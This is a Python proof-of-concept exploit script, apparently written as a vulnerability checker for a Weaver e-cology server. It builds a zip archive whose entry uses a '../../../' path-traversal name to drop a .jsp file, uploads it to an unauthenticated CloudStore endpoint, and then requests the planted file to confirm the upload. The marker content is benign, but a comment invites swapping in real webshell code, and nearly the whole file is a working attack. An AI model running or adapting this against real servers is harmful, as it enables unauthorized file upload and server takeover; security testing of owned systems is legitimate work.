#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import zipfile
import random
import sys
import requests

webshell_name1 = 'vulntest.jsp'
webshell_name2 = '../../../'+webshell_name1

def file_zip():
    shell = """VulnTest"""   ## 替换shell内容
    zf = zipfile.ZipFile('vulntest.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def verify(site):
    file_zip()
    urls = site + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', ('vulntest.zip', open('vulntest.zip', 'rb'), 'application/zip'))]
    requests.post(url=urls,files=file,timeout=60, verify=False)
    GetShellurl = site+'/cloudstore/'+webshell_name1
    GetShelllist = requests.get(url = GetShellurl)
    content = GetShelllist.text
    if GetShelllist.status_code == 200 and content=='VulnTest':
        return GetShellurl
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后路径为：", info)
    else:
        print("[-]漏洞不存在")
